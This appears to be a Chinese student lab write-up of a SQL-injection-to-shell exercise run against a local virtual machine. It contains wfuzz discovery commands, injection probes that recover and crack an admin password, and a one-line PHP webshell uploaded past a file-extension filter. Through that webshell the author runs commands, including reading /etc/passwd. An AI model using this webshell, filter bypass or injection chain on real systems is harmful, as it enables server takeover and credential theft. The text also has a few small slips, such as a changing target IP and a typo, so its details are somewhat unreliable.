# Chapter 7:from sql to shell

## 实验环境

Attack与Victim设置均为NAT网络

Attack IP: 10.0.2.15    

Victim IP: 10.0.2.5

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/ifconfig.PNG)

## 实验过程

### 指纹

#### 检查HTTP标头

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/SendHTTP.PNG)

* 攻击机使用浏览器访问目标服务器，使用burpsuite查看response包

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/index_php.PNG)

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/Response.PNG)

#### 使用wfuzz检测web服务器页面和目录

运行命令来检测远程文件和目录：

python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://10.0.2.5/FUZZ

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/wfuzz.PNG)

检测服务器上的PHP脚本：

python wfuzz.py -z file -f commons.txt --hc 404 http://10.0.2.5/FUZZ.php

### SQL注入的检测和利用

#### 基于整数的检测

通过地址 http://10.0.2.7/cat.php?id=2-1 获取的页面与id=1时获取页面相同，存在SQL注入漏洞。

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/php2-1.PNG)

#### UNION 关键字

*  递增查询列数,列数为4时，返回正确结果

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/union12.PNG)

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/union1234.PNG)

#### Order By 关键字

* 使用order by语句来检测查询列的数目，数目大于4时，返回报错信息

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/orderby3.PNG)

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/orderby5.PNG)

### 检索信息

* 通过@@version，current_user()和database()获得数据库版本信息、当前用户信息以及数据库名

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/version.PNG)

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/current_user.PNG)

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/database.PNG)

* 查询表中信息

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/table.PNG)

* 检索到管理员密码

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/password.PNG)

通过MD5在线解密工具解密，得到密码：P4ssw0rd

* 以管理员身份登录

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/admin_index_php.PNG)

### 上传Webshel​​l和代码执行

* 编写php脚本

<?php

  system（$ _ GET ['cmd']）;

?>

* 找到上传文件界面

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/shellphp1.PNG)

* 以.php为后缀的文件上传失败

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/shellphp2.PNG)

* 文件shell.php.test绕过过滤，上传成功。

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/shellphptest1.PNG)

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/shellphptest2.PNG)

* 使用cmd=umname获得服务器当前系统版本

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/cmd_uname.PNG)

* 使用cmd=ls获取当前目录的内容

![](https://raw.githubusercontent.com/U2Vino/ns/Chapter7/2017-2/cmd_ls.PNG)

* 还可以用cat /etc/passwd 获取系统用户的完整列表

* .....
